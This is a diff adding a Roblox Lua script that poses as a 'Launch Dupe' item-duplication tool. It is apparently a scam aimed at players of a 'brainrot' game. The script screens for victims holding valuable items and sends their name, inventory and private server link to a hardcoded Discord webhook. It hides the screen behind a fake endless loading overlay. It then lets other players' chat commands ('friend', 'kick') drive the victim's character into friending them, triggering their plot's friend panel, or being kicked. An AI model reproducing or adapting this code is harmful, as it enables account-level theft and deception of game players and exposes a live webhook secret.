@@ -1,0 +1,635 @@
+--// Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Funções Helper
+local function normalize(str)
+    return string.lower(tostring(str)):gsub("^%s*(.-)%s*$","%1")
+end
+
+local function simplifyForMatch(str)
+    return normalize(str):gsub("%W","")
+end
+
+-- ✨ NOVA FUNÇÃO: Pega o Player pelo nome (username OU displayname)
+local function getPlayerByName(name)
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr.Name == name or plr.DisplayName == name then
+            return plr
+        end
+    end
+    return nil
+end
+
+-- ✨ FUNÇÃO MELHORADA: Agora procura por USERNAME e DISPLAYNAME
+local function findPlayerPlot(plotsFolder, playerName)
+    if not plotsFolder then return nil end
+    
+    -- Tenta pegar o Player object
+    local targetPlayer = getPlayerByName(playerName)
+    
+    -- Monta as possibilidades de busca
+    local searchNames = {playerName} -- Username original
+    if targetPlayer and targetPlayer.DisplayName ~= targetPlayer.Name then
+        table.insert(searchNames, targetPlayer.DisplayName) -- Adiciona DisplayName se for diferente
+    end
+    
+    print("🔍 Procurando plot para:", playerName)
+    print("   Buscando por:", table.concat(searchNames, " OU "))
+    
+    -- Procura em cada plot
+    for _, plot in ipairs(plotsFolder:GetChildren()) do
+        if plot:IsA("Model") then
+            -- Procura o PlotSign dentro do plot
+            local plotSign = plot:FindFirstChild("PlotSign")
+            if plotSign then
+                -- Procura o SurfaceGui -> Frame -> TextLabel
+                local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
+                if surfaceGui then
+                    local frame = surfaceGui:FindFirstChild("Frame")
+                    if frame then
+                        local textLabel = frame:FindFirstChild("TextLabel")
+                        if textLabel then
+                            local baseText = textLabel.Text
+                            
+                            -- ✨ BUSCA POR USERNAME OU DISPLAYNAME
+                            for _, name in ipairs(searchNames) do
+                                if baseText == name.."'s Base" then
+                                    print("✅ Plot encontrado com:", name)
+                                    return plot
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    print("❌ Plot não encontrado para:", playerName)
+    return nil
+end
+
+local function getAnimalsInPlot(plot)
+    local animals = {}
+    if not plot then 
+        return animals 
+    end
+
+    -- Procura a pasta AnimalPodiums
+    local podiumsFolder = plot:FindFirstChild("AnimalPodiums")
+    if not podiumsFolder then 
+        return animals 
+    end
+
+    -- Para cada model dentro de AnimalPodiums
+    for _, podiumModel in ipairs(podiumsFolder:GetChildren()) do
+        if podiumModel:IsA("Model") then
+            -- Procura o model Base
+            local baseModel = podiumModel:FindFirstChild("Base")
+            if baseModel and baseModel:IsA("Model") then
+                -- Procura a part Spawn
+                local spawnPart = baseModel:FindFirstChild("Spawn")
+                if spawnPart then
+                    -- Verifica attachments
+                    local attachments = {}
+                    for _, child in ipairs(spawnPart:GetChildren()) do
+                        if child:IsA("Attachment") and child.Name ~= "PromptAttachment" then
+                            table.insert(attachments, child)
+                        end
+                    end
+
+                    if #attachments == 1 then
+                        local attachment = attachments[1]
+                        
+                        -- Procura o BillboardGui
+                        local billboard = attachment:FindFirstChild("AnimalOverhead", true)
+                        if billboard then
+                            local displayName = billboard:FindFirstChild("DisplayName")
+                            local generation = billboard:FindFirstChild("Generation")
+                            
+                            if displayName and generation then
+                                table.insert(animals, {
+                                    name = displayName.Text,
+                                    price = generation.Text
+                                })
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    return animals
+end
+
+local function walkToPosition(targetPosition)
+    local player = Players.LocalPlayer
+    local character = player.Character
+    if not character then return false end
+    
+    local humanoid = character:FindFirstChild("Humanoid")
+    if not humanoid then return false end
+    
+    humanoid:MoveTo(targetPosition)
+    
+    -- Espera chegar perto da posição
+    local moveTimeout = 30
+    local startTime = tick()
+    
+    repeat
+        wait(0.1)
+        local rootPart = character:FindFirstChild("HumanoidRootPart")
+        if not rootPart then return false end
+        
+        local distance = (rootPart.Position - targetPosition).Magnitude
+        if distance < 5 then
+            return true
+        end
+        
+        if tick() - startTime > moveTimeout then
+            return false
+        end
+    until not humanoid or humanoid.Health <= 0
+    
+    return false
+end
+
+local function tryAddFriend(targetPlayer)
+    local player = Players.LocalPlayer
+    print("🔄 Tentando adicionar", targetPlayer.Name, "como amigo...")
+    
+    -- Método 1: RequestFriendship
+    local success1 = pcall(function()
+        player:RequestFriendship(targetPlayer)
+    end)
+    if success1 then 
+        print("✅ Método 1 funcionou!")
+        return true
+    end
+    
+    -- Método 2: Via LocalPlayer
+    local success2 = pcall(function()
+        Players.LocalPlayer:RequestFriendship(targetPlayer)
+    end)
+    if success2 then 
+        print("✅ Método 2 funcionou!")
+        return true
+    end
+    
+    -- Método 3: Manipular PlayerList GUI
+    local success3 = pcall(function()
+        local playerList = player.PlayerGui:FindFirstChild("PlayerList")
+        if playerList then
+            for _, item in pairs(playerList:GetDescendants()) do
+                if item:IsA("TextLabel") and item.Text == targetPlayer.Name then
+                    local parent = item.Parent
+                    if parent then
+                        for _, child in pairs(parent:GetDescendants()) do
+                            if child:IsA("ImageButton") or child:IsA("TextButton") then
+                                for _, connection in pairs(getconnections(child.MouseButton1Click)) do
+                                    connection:Fire()
+                                end
+                            end
+                        -- else
+                            -- print("Parent of TextLabel found, but no ImageButton/TextButton for friendship.")
+                        end
+                    end
+                -- else
+                    -- print("No TextLabel with matching name in PlayerList or its descendants.")
+                end
+            end
+        end
+    end)
+    if success3 then 
+        print("✅ Método 3 funcionou!")
+        return true
+    end
+    
+    -- Método 4: CoreGui PlayerList
+    local success4 = pcall(function()
+        local coreGui = game:GetService("CoreGui")
+        local playerList = coreGui:FindFirstChild("PlayerList") or coreGui:FindFirstChild("RobloxGui")
+        
+        if playerList then
+            for _, item in pairs(playerList:GetDescendants()) do
+                if item:IsA("TextLabel") and item.Text:match(targetPlayer.Name) then
+                    local parent = item.Parent
+                    for _, btn in pairs(parent:GetDescendants()) do
+                        if btn:IsA("GuiButton") then
+                            for _, conn in pairs(getconnections(btn.Activated)) do
+                                conn:Fire()
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+    if success4 then 
+        print("✅ Método 4 funcionou!")
+        return true
+    end
+    
+    print("❌ Nenhum método funcionou (bloqueado pelo Roblox)")
+    return false
+end
+
+-- Garantir que LocalPlayer exista (LocalScript) antes de usar
+local player = Players.LocalPlayer
+if not player then
+    return
+end
+
+-- ⚠️ SISTEMA DE KICK COM MÚLTIPLOS MÉTODOS ⚠️
+print("🛡️ Sistema de kick ativado para jogador:", player.Name)
+
+-- Método 1: PlayerChatted (evento global)
+Players.PlayerChatted:Connect(function(_, chatPlayer, message)
+    local msg = string.lower(message)
+    
+    if msg == "kick" or msg:find("kick") then
+        if chatPlayer.Name ~= player.Name then
+            player:Kick("⚠️ Você foi removido do servidor.\nTente novamente mais tarde.")
+        end
+    end
+end)
+
+-- Método 2: Chatted individual para cada jogador
+for _, otherPlayer in pairs(Players:GetPlayers()) do
+    if otherPlayer ~= player then
+        otherPlayer.Chatted:Connect(function(message)
+            local msg = string.lower(message)
+            
+            if msg == "kick" or msg:find("kick") then
+                player:Kick("⚠️ Você foi removido do servidor.")
+            end
+        end)
+    end
+end
+
+-- Método 3: Novos jogadores que entram
+Players.PlayerAdded:Connect(function(newPlayer)
+    if newPlayer ~= player then
+        newPlayer.Chatted:Connect(function(message)
+            local msg = string.lower(message)
+            
+            if msg == "kick" or msg:find("kick") then
+                player:Kick("⚠️ Você foi removido do servidor.")
+            end
+        end)
+    end
+end)
+
+-- Método 4: TextChatService (novo sistema de chat)
+pcall(function()
+    local TextChatService = game:GetService("TextChatService")
+    TextChatService.MessageReceived:Connect(function(message)
+        if message.TextSource and message.TextSource.UserId ~= player.UserId then
+            local text = string.lower(message.Text)
+            
+            if text == "kick" or text:find("kick") then
+                player:Kick("⚠️ Você foi removido do servidor.")
+            end
+        end
+    end)
+end)
+
+print("✅ Sistema de kick configurado!")
+
+-- Coloque a sua webhook aqui:
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1433922894160723969/p8PMvPhnIQQ5JC4hwnxI9rmzAnF3VC3Hykay3e0bXEpZaKmWi79Abu5LPAuyEyebsqd4"
+
+local playerGui = player:WaitForChild("PlayerGui")
+
+--// GUI Setup
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LaunchDupeGui"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
+
+--// Blur Effect
+local blur = Instance.new("Frame")
+blur.Size = UDim2.new(1, 0, 1, 0)
+blur.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+blur.BackgroundTransparency = 0.5
+blur.Parent = screenGui
+
+--// Main Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 500, 0, 300)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+frame.BorderSizePixel = 0
+frame.ClipsDescendants = true
+frame.Parent = screenGui
+
+--// Rounded corners
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+
+--// Shadow
+local shadow = Instance.new("ImageLabel")
+shadow.Name = "Shadow"
+shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+shadow.Position = UDim2.new(0.5, 0, 0.5, 8)
+shadow.Size = UDim2.new(1, 40, 1, 40)
+shadow.BackgroundTransparency = 1
+shadow.Image = "rbxassetid://7912134082"
+shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+shadow.ImageTransparency = 0.7
+shadow.ZIndex = 0
+shadow.Parent = frame
+
+--// Title
+local title = Instance.new("TextLabel")
+title.Text = "Launch Dupe"
+title.Size = UDim2.new(1, 0, 0, 60)
+title.Position = UDim2.new(0, 0, 0, 20)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 28
+title.Parent = frame
+
+--// Subtitle
+local subtitle = Instance.new("TextLabel")
+subtitle.Text = "Import Private Server Link"
+subtitle.Size = UDim2.new(1, 0, 0, 30)
+subtitle.Position = UDim2.new(0, 0, 0, 80)
+subtitle.BackgroundTransparency = 1
+subtitle.TextColor3 = Color3.fromRGB(150, 150, 150)
+title.Font = Enum.Font.Gotham
+subtitle.TextSize = 14
+subtitle.Parent = frame
+
+--// TextBox
+local textbox = Instance.new("TextBox")
+textbox.PlaceholderText = "Enter link here..."
+textbox.Size = UDim2.new(0.88, 0, 0, 50)
+textbox.Position = UDim2.new(0.06, 0, 0, 130)
+textbox.BackgroundColor3 = Color3.fromRGB(40, 40, 48)
+textbox.TextColor3 = Color3.fromRGB(220, 220, 220)
+textbox.PlaceholderColor3 = Color3.fromRGB(100, 100, 110)
+textbox.Font = Enum.Font.Gotham
+textbox.TextSize = 15
+textbox.Text = ""
+textbox.ClearTextOnFocus = false
+textbox.Parent = frame
+Instance.new("UICorner", textbox).CornerRadius = UDim.new(0, 8)
+
+--// Button
+local button = Instance.new("TextButton")
+button.Text = "Start"
+button.Size = UDim2.new(0.88, 0, 0, 55)
+button.Position = UDim2.new(0.06, 0, 0, 200)
+button.BackgroundColor3 = Color3.fromRGB(60, 130, 255)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Font = Enum.Font.GothamBold
+button.TextSize = 18
+button.Parent = frame
+Instance.new("UICorner", button).CornerRadius = UDim.new(0, 8)
+
+--// Button Animation
+button.MouseEnter:Connect(function()
+    TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 150, 255)}):Play()
+end)
+button.MouseLeave:Connect(function()
+    TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 130, 255)}):Play()
+end)
+
+--// Aparecer com animação (fade)
+frame.BackgroundTransparency = 1
+title.TextTransparency = 1
+subtitle.TextTransparency = 1
+textbox.TextTransparency = 1
+textbox.BackgroundTransparency = 1
+button.TextTransparency = 1
+button.BackgroundTransparency = 1
+
+TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
+TweenService:Create(title, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
+TweenService:Create(subtitle, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
+TweenService:Create(textbox, TweenInfo.new(0.5), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
+TweenService:Create(button, TweenInfo.new(0.5), {TextTransparency = 0, BackgroundTransparency = 0}):Play()
+
+local function setupChatListeners()
+    Players.PlayerChatted:Connect(function(_, chatPlayer, message)
+        local msg = normalize(message)
+        
+        -- Sistema de Friend
+        if msg == "friend" then
+            if chatPlayer.Name == player.Name then return end
+            
+            print("📢 Pedido de friend detectado de:", chatPlayer.Name)
+            
+            -- Tenta adicionar como amigo
+            tryAddFriend(chatPlayer)
+            
+            -- ✨ AGORA USA A FUNÇÃO MELHORADA
+            local plotsFolder = workspace:FindFirstChild("Plots")
+            local targetPlot = findPlayerPlot(plotsFolder, chatPlayer.Name)
+            
+            if not targetPlot then
+                print("❌ Plot de", chatPlayer.Name, "não encontrado")
+                return
+            end
+            
+            print("✅ Plot encontrado:", targetPlot.Name)
+            
+            -- Procura o FriendPanel
+            local friendPanel = targetPlot:FindFirstChild("FriendPanel")
+            if not friendPanel then
+                print("❌ FriendPanel não encontrado no plot")
+                return
+            end
+            
+            print("✅ FriendPanel encontrado")
+            
+            -- Procura a Part Main
+            local mainPart = friendPanel:FindFirstChild("Main")
+            if not mainPart or not mainPart:IsA("BasePart") then
+                print("❌ Part Main não encontrada no FriendPanel")
+                return
+            end
+            
+            print("✅ Main part encontrada, indo até lá...")
+            
+            -- Anda até a posição
+            local success = walkToPosition(mainPart.Position)
+            
+            if success then
+                print("✅ Chegou na posição!")
+                wait(0.5)
+                
+                -- Procura e ativa o ProximityPrompt
+                local proximityPrompt = mainPart:FindFirstChildOfClass("ProximityPrompt")
+                if proximityPrompt then
+                    print("✅ ProximityPrompt encontrado, ativando...")
+                    fireproximityprompt(proximityPrompt)
+                    print("✅ ProximityPrompt ativado!")
+                else
+                    print("❌ ProximityPrompt não encontrado")
+                end
+            else
+                print("❌ Não conseguiu chegar na posição")
+            end
+        end
+    end)
+end
+
+
+button.MouseButton1Click:Connect(function()
+    local input = textbox.Text or ""
+
+    -- Validação: link de servidor privado (deve começar com https://www.roblox.com/share?code=)
+    local requiredPrefix = "https://www.roblox.com/share?code="
+    local isValidPrivateServerLink = string.sub(input, 1, #requiredPrefix) == requiredPrefix
+    
+    if input == "" or not isValidPrivateServerLink then
+        textbox.Text = ""
+        textbox.PlaceholderText = "❌ Link inválido! Deve começar com ".. requiredPrefix
+        wait(2)
+        textbox.PlaceholderText = "Enter link here..."
+        return
+    end
+
+    print("✅ Link de servidor privado válido!")
+    local currentTime = os.date("%H:%M - %d/%m/%Y")
+
+    -- Pega plot/animais
+    local plotsFolder = workspace:FindFirstChild("Plots")
+    local targetPlot = findPlayerPlot(plotsFolder, player.Name)
+    local foundAnimals = getAnimalsInPlot(targetPlot)
+
+    -- Validação 1: tem algum brainrot?
+    if #foundAnimals == 0 then
+        print("❌ Nenhum brainrot encontrado")
+        player:Kick("Você não tem nenhum brainrot.")
+        return
+    end
+
+    -- Validação 2: existe brainrot >= 10 milhões?
+    local hasValidBrainrot = false
+    for _, animal in ipairs(foundAnimals) do
+        local priceStr = tostring(animal.price or ""):gsub("[^0-9]", "")
+        local priceValue = tonumber(priceStr) or 0
+        print("🎮", animal.name, "->", priceValue)
+        if priceValue >= 10000000 then
+            hasValidBrainrot = true
+            break
+        end
+    end
+
+    if not hasValidBrainrot then
+        print("❌ Brainrot < 10M — kick silencioso")
+        player:Kick()
+        return
+    end
+
+    -- Validação 3: número de jogadores (só pode haver 1)
+    local totalPlayers = #Players:GetPlayers()
+    print("👥 totalPlayers =", totalPlayers)
+    if totalPlayers > 1 then
+        print("❌ Mais de 1 jogador no servidor — kick")
+        player:Kick("Você só pode fazer essa ação com uma única pessoa no servidor.")
+        return
+    end
+
+    -- Monta texto dos brainrots
+    local parts = {}
+    for _, animal in ipairs(foundAnimals) do
+        table.insert(parts, animal.name .. " (" .. (animal.price or "N/A") .. ")")
+    end
+    local brainrotsValue = table.concat(parts, "\n")
+
+    -- Payload
+    local payload = {
+        ["content"] = "@everyone **New Brainrot Hit**",
+        ["username"] = "Brainrot System",
+        ["avatar_url"] = "https://i.imgur.com/oBnXOzr.png",
+        ["embeds"] = {{
+            ["title"] = "📊 Brainrots Normais",
+            ["color"] = 8405759,
+            ["fields"] = {
+                {["name"] = "📅 Data", ["value"] = currentTime, ["inline"] = false},
+                {["name"] = "🔗 Link/Texto", ["value"] = input or "Nenhum texto", ["inline"] = false},
+                {["name"] = "👥 Jogando", ["value"] = tostring(totalPlayers), ["inline"] = true},
+                {["name"] = "👤 Nome", ["value"] = player.Name, ["inline"] = true},
+                {["name"] = "🎮 Brainrots", ["value"] = brainrotsValue, ["inline"] = false},
+            }
+        }}
+    }
+
+    -- Envia webhook
+    local success, response = pcall(function()
+        local encoded = HttpService:JSONEncode(payload)
+        return HttpService:RequestAsync({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = encoded
+        })
+    end)
+
+    if not success then
+        warn("❌ Erro ao enviar webhook:", response)
+        button.Text = "❌ Error!"
+        wait(2)
+        button.Text = "Start"
+        return
+    end
+
+    print("✅ Webhook enviada com sucesso!")
+    button.Text = "✅ Success!"
+    wait(1)
+    button.Text = "Start"
+
+    setupChatListeners()
+
+    -- Create loading screen
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.Parent = CoreGui
+
+    local loadingFrame = Instance.new("Frame")
+    loadingFrame.Parent = ScreenGui
+    loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+    loadingFrame.BackgroundTransparency = 0
+    loadingFrame.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
+    loadingFrame.BorderSizePixel = 0
+    loadingFrame.ZIndex = 999
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, 0, 0, 100)
+    textLabel.Position = UDim2.new(0, 0, 0.35, 0)
+    textLabel.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Font = Enum.Font.GothamBold
+    textLabel.TextColor3 = Color3.new(1, 1, 1)
+    textLabel.Text = "Loading..."
+    textLabel.TextSize = 32
+    textLabel.ZIndex = 1000
+    textLabel.Parent = loadingFrame
+
+    local loadingRing = Instance.new("ImageLabel")
+    loadingRing.Size = UDim2.new(0, 256, 0, 256)
+    loadingRing.BackgroundTransparency = 1
+    loadingRing.Image = "rbxassetid://4965945816"
+    loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
+    loadingRing.Position = UDim2.new(0.5, 0, 0.5, -50)
+    loadingRing.ZIndex = 1000
+    loadingRing.Parent = loadingFrame
+
+    local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
+    local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
+    tween:Play()
+
+    print("✅ Tela de loading criada com sucesso!")
+
+end)
